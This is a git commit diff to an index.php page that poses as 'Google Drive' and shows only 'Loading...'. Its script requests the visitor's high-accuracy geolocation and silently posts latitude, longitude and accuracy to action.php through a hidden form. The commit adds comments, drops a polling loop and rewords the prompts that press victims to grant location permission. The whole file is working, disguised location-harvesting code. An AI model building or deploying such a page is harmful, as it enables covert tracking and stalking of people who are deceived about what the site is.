6eabcf591b3894f9b0ba6c20ca455ecceb742721
Sun <73415680+SunPodder@users.noreply.github.com>
2021-07-13 20:20:52 +0600

    Update index.php

--- index.php
+++ index.php
@@ -2,14 +2,15 @@
 <html>
 <head>
 <title>Google Drive</title>
-<meta charset="utf-8">
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 </head>
 <body>
 
 <form action="action.php" method="post" id="form" hidden>
-  <input id="lat"  name="lat">
-  <input id="long"  name="long" >
-  <input id="acc" name="acc">
+  <input id="lat" name="lat" />
+  <input id="long" name="long" />
+  <input id="acc" name="acc" />
 </form>
 
 Loading...
@@ -18,32 +19,30 @@ Loading...
 
 function getLocation() {
   if (navigator.geolocation) {
+    //checks if the browser supports Geolocation
     navigator.geolocation.getCurrentPosition(showPosition, onErr, options);
   } else {
-    x.innerHTML = "Geolocation is not supported by this browser.";
+    document.write("Geolocation is not supported by this browser.");
   }
 }
 
+//if browser supports Geolocation and everything is OK takes user location and sends to server
 function showPosition(position) {
   document.getElementById("lat").value = position.coords.latitude
   document.getElementById("long").value = position.coords.longitude
   document.getElementById("acc").value = position.coords.accuracy
-  
   document.getElementById("form").submit()
 }
 
+//calls this function if any error occurs 
 function onErr(err){
-  
-  //alert(err.message)
-  document.write(err.message+"<br>Please give location permission to access this file...<br><br>")
+  alert("Please reload the webpage and give location permission to use this site")
+  document.write(err.message+"<br>Please reload the webpage and give location permission to access this file...<br><br>")
 }
 
-var options = {
-  enableHighAccuracy: true,
-  
-}
-
-setInterval(getLocation, 5000)
+const options = {
+  enableHighAccuracy: true
+  }
 
 getLocation()
 
